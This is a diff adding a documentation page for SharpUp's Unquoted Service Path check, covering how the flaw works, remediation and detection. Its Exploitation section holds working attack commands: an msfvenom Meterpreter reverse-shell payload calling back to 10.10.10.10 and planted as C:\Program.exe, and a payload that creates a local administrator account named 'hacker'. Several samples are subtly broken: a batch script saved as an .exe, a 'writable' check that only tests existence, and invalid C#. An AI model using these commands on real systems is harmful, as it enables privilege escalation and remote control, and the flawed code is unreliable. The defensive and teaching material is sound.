@@ -1,0 +1,457 @@
+---
+title: 'Unquoted Service Path'
+description: 'Services with unquoted paths containing spaces'
+icon: 'quote-left'
+---
+
+## Overview
+
+The Unquoted Service Path check identifies Windows services where the executable path contains spaces but is not enclosed in quotes. This creates an ambiguity in how Windows interprets the path, potentially allowing an attacker to place a malicious executable that will be executed instead of the intended service binary.
+
+<Info>
+This vulnerability exists because Windows searches for executables by tokenizing paths at spaces when quotes are missing.
+</Info>
+
+## How It Works
+
+When Windows tries to start a service with an unquoted path like:
+
+```
+C:\Program Files\My App\service.exe
+```
+
+Windows will search for executables in this order:
+1. `C:\Program.exe`
+2. `C:\Program Files\My.exe`
+3. `C:\Program Files\My App\service.exe`
+
+If an attacker can write to any of the earlier locations, they can execute arbitrary code.
+
+### Technical Details
+
+SharpUp:
+1. Enumerates all services from registry
+2. Extracts the `ImagePath` value
+3. Checks if path:
+   - Doesn't start with quotes
+   - Contains spaces
+   - Ends with .exe
+4. For each space in the path, checks if the parent directory is writable
+5. Reports services where malicious executables can be placed
+
+## Example Output
+
+```
+=== Services with Unquoted Paths ===
+    Service 'MyApp' (StartMode: Automatic) has executable 'C:\Program Files\My App\service.exe', but 'C:\Program' is modifiable.
+
+    Service 'BackupSvc' (StartMode: Manual) has executable 'C:\Custom Tools\Backup Service\backup.exe', but 'C:\Custom' is modifiable.
+```
+
+**Interpretation:**
+- MyApp service has unquoted path with spaces
+- You can write to C:\ to create C:\Program.exe
+- When MyApp service starts, Windows will execute C:\Program.exe first
+- Service runs as SYSTEM, giving you SYSTEM privileges
+
+## Exploitation
+
+### Method 1: Exploit First Space
+
+```powershell
+# Service path: C:\Program Files\My App\service.exe
+# Can write to C:\
+
+# Create malicious Program.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o Program.exe
+
+# Copy to C:\
+Copy-Item Program.exe C:\Program.exe
+
+# Restart service or reboot
+Restart-Service -Name MyApp
+# Or
+shutdown /r /t 0
+```
+
+### Method 2: Exploit Second Space
+
+```powershell
+# Service path: C:\Program Files\My App\service.exe
+# Cannot write to C:\ but can write to C:\Program Files\
+
+# Create malicious "My.exe"
+Copy-Item malicious.exe "C:\Program Files\My.exe"
+
+# Restart service
+Restart-Service -Name MyApp
+```
+
+### Method 3: Persistence via Unquoted Path
+
+```powershell
+# Find unquoted service paths
+$services = Get-WmiObject Win32_Service | Where-Object {
+    $_.PathName -notmatch '^"' -and
+    $_.PathName -match ' ' -and
+    $_.PathName -match '\.exe'
+}
+
+foreach ($service in $services) {
+    $path = $service.PathName
+
+    # Extract path before first .exe
+    if ($path -match '(.+\.exe)') {
+        $exePath = $matches[1]
+
+        # Find exploitable space
+        $parts = $exePath -split ' '
+        for ($i = 0; $i -lt $parts.Length - 1; $i++) {
+            $testPath = ($parts[0..$i] -join ' ') + '.exe'
+            $parentDir = Split-Path $testPath
+
+            # Check if writable
+            if (Test-Path $parentDir) {
+                Write-Host "[+] Exploitable: $($service.Name)"
+                Write-Host "    Create: $testPath"
+                Write-Host "    StartMode: $($service.StartMode)"
+            }
+        }
+    }
+}
+```
+
+### Method 4: Automatic Execution
+
+```powershell
+# If service is set to Automatic, payload runs at boot
+# No interaction needed after placing malicious executable
+
+# Create payload
+$payload = @"
+@echo off
+net user hacker P@ssw0rd123! /add
+net localgroup administrators hacker /add
+exit
+"@
+
+$payload | Out-File -FilePath "C:\Program.exe" -Encoding ASCII
+
+# Wait for reboot - payload executes automatically
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Identify Unquoted Service Paths">
+    ```powershell
+    # Find all services with unquoted paths
+    Get-WmiObject Win32_Service |
+    Where-Object {
+        $_.PathName -notmatch '^"' -and
+        $_.PathName -match ' ' -and
+        $_.PathName -match '\.exe'
+    } |
+    Select-Object Name, DisplayName, PathName, State, StartMode |
+    Format-Table -AutoSize
+    ```
+  </Step>
+
+  <Step title="Quote Service Paths">
+    ```powershell
+    # Fix individual service
+    $serviceName = "MyApp"
+    $service = Get-WmiObject Win32_Service -Filter "Name='$serviceName'"
+    $currentPath = $service.PathName
+
+    # Extract executable and arguments
+    if ($currentPath -match '(.+\.exe)(.*)') {
+        $exePath = $matches[1]
+        $args = $matches[2]
+
+        # Create quoted path
+        $newPath = "`"$exePath`"$args"
+
+        # Update service
+        sc.exe config $serviceName binpath= $newPath
+
+        Write-Host "[+] Fixed: $serviceName"
+        Write-Host "    Old: $currentPath"
+        Write-Host "    New: $newPath"
+    }
+    ```
+  </Step>
+
+  <Step title="Bulk Remediation">
+    ```powershell
+    # Fix all unquoted service paths
+    $services = Get-WmiObject Win32_Service |
+    Where-Object {
+        $_.PathName -notmatch '^"' -and
+        $_.PathName -match ' ' -and
+        $_.PathName -match '\.exe'
+    }
+
+    foreach ($service in $services) {
+        $path = $service.PathName
+
+        if ($path -match '(.+\.exe)(.*)') {
+            $exe = $matches[1]
+            $args = $matches[2]
+            $newPath = "`"$exe`"$args"
+
+            try {
+                sc.exe config $service.Name binpath= $newPath
+                Write-Host "[+] Fixed: $($service.Name)" -ForegroundColor Green
+            }
+            catch {
+                Write-Host "[-] Error fixing $($service.Name): $_" -ForegroundColor Red
+            }
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Secure Parent Directories">
+    Even after quoting paths, ensure parent directories have proper permissions:
+
+    ```powershell
+    # Secure C:\Program Files
+    icacls "C:\Program Files" /inheritance:r
+    icacls "C:\Program Files" /grant:r "SYSTEM:(OI)(CI)F"
+    icacls "C:\Program Files" /grant:r "Administrators:(OI)(CI)F"
+    icacls "C:\Program Files" /grant:r "Users:(OI)(CI)RX"
+    ```
+  </Step>
+
+  <Step title="Verify Fix">
+    ```bash
+    # Re-run check
+    SharpUp.exe UnquotedServicePath
+    ```
+
+    Should return no vulnerable services.
+  </Step>
+</Steps>
+
+### Automated Remediation Script
+
+```powershell
+# Comprehensive unquoted path remediation
+$results = @()
+
+Get-WmiObject Win32_Service |
+Where-Object {
+    $_.PathName -notmatch '^"' -and
+    $_.PathName -match ' ' -and
+    $_.PathName -match '\.exe'
+} |
+ForEach-Object {
+    $service = $_
+    $oldPath = $service.PathName
+
+    if ($oldPath -match '(.+\.exe)(.*)') {
+        $exe = $matches[1].Trim()
+        $args = $matches[2].Trim()
+        $newPath = if ($args) { "`"$exe`" $args" } else { "`"$exe`"" }
+
+        try {
+            # Update service
+            $result = sc.exe config $service.Name binpath= $newPath 2>&1
+
+            if ($LASTEXITCODE -eq 0) {
+                $status = "Success"
+                Write-Host "[+] Fixed: $($service.Name)" -ForegroundColor Green
+            }
+            else {
+                $status = "Failed: $result"
+                Write-Host "[-] Failed: $($service.Name) - $result" -ForegroundColor Red
+            }
+        }
+        catch {
+            $status = "Error: $($_.Exception.Message)"
+            Write-Host "[-] Error: $($service.Name) - $($_.Exception.Message)" -ForegroundColor Red
+        }
+
+        $results += [PSCustomObject]@{
+            ServiceName = $service.Name
+            DisplayName = $service.DisplayName
+            OldPath = $oldPath
+            NewPath = $newPath
+            Status = $status
+        }
+    }
+}
+
+# Export report
+$results | Export-Csv "UnquotedPathRemediation_$(Get-Date -Format yyyyMMdd).csv" -NoTypeInformation
+Write-Host "`n[+] Report saved"
+```
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Monitor service configuration changes
+auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
+
+# Monitor Event IDs:
+# 4697 - Service installed
+# 7045 - Service installed (System log)
+
+# Monitor registry changes to service ImagePath
+$servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services"
+
+Get-ChildItem $servicePath | ForEach-Object {
+    $acl = Get-Acl $_.PSPath
+    $auditRule = New-Object System.Security.AccessControl.RegistryAuditRule(
+        "Everyone",
+        "SetValue",
+        "None",
+        "None",
+        "Success"
+    )
+    $acl.AddAuditRule($auditRule)
+    Set-Acl $_.PSPath $acl
+}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="File System Monitoring">
+    - Monitor file creation in Program Files root
+    - Alert on .exe files in unusual locations (C:\Program.exe)
+    - Track file writes to directories containing unquoted service paths
+  </Tab>
+
+  <Tab title="Service Monitoring">
+    - Baseline service configurations
+    - Alert on service ImagePath changes
+    - Monitor service startup failures
+    - Detect unusual child processes from services
+  </Tab>
+
+  <Tab title="Configuration Auditing">
+    - Regularly scan for unquoted service paths
+    - Alert when new unquoted services are installed
+    - Track remediation progress
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Third-Party Application">
+    **Context:** Third-party monitoring application installed with unquoted path: `C:\Program Files\Monitor Tool\service.exe`
+
+    **Vulnerable Directories:**
+    - C:\Program.exe (if writable)
+    - C:\Program Files\Monitor.exe (if writable)
+
+    **Attack:**
+    1. Standard user gains access
+    2. Finds unquoted path via SharpUp
+    3. Places malicious Program.exe in C:\
+    4. Waits for service restart or reboot
+    5. Service runs malicious Program.exe as SYSTEM
+
+    **Prevention:**
+    - Work with vendor to fix installer
+    - Manually quote service path
+    - Ensure C:\ is not writable by users
+  </Accordion>
+
+  <Accordion title="Scenario 2: Custom IT Service">
+    **Context:** IT team created custom service installed to `C:\Company Tools\Update Service\updater.exe` with Automatic startup.
+
+    **Risk:**
+    - Can create C:\Company.exe
+    - Service restarts every boot
+    - Automatic privilege escalation
+
+    **Solution:**
+    - Quote the path immediately
+    - Move service to standard Program Files location
+    - Ensure installation directory has proper permissions
+  </Accordion>
+
+  <Accordion title="Scenario 3: Legacy Application">
+    **Context:** 10-year-old application with unquoted service path on 1,000 servers.
+
+    **Challenges:**
+    - Vendor no longer supported
+    - Can't easily update all servers
+    - Service critical for operations
+
+    **Approach:**
+    1. Quote paths via automated script
+    2. Test on non-production servers first
+    3. Deploy via GPO or SCCM
+    4. Verify no application breakage
+    5. Monitor for issues
+  </Accordion>
+</AccordionGroup>
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Always Quote Paths" icon="quote-left">
+    Developers: Always enclose service paths in quotes, even without spaces.
+  </Card>
+  <Card title="Install to Program Files" icon="folder">
+    Install applications to standard protected locations.
+  </Card>
+  <Card title="Regular Audits" icon="magnifying-glass">
+    Periodically scan for and remediate unquoted paths.
+  </Card>
+  <Card title="Secure Permissions" icon="lock">
+    Ensure root directories (C:\) have proper write restrictions.
+  </Card>
+</CardGroup>
+
+### Development Best Practice
+
+```csharp
+// When creating a Windows service
+// ALWAYS quote the binary path
+
+string servicePath = @"C:\Program Files\MyApp\Service.exe";
+
+// Correct way to register service
+sc.exe create MyService binpath= "\"" + servicePath + "\""
+
+// Result: binpath= "C:\Program Files\MyApp\Service.exe"
+
+// Also acceptable: use InstallUtil or .NET ServiceInstaller
+// which automatically quotes paths
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Modifiable Services" icon="gear" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservices">
+    Services with weak DACL permissions
+  </Card>
+  <Card title="Modifiable Service Binaries" icon="file-binary" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservicebinaries">
+    Service executables with weak file permissions
+  </Card>
+  <Card title="Hijackable Paths" icon="route" href="/ghostpack-docs/SharpUp-mdx/checks/hijackablepaths">
+    Writable folders in system PATH
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">
+    Service Security and Access Rights
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1574/009/">
+    T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
+  </Card>
+</CardGroup>
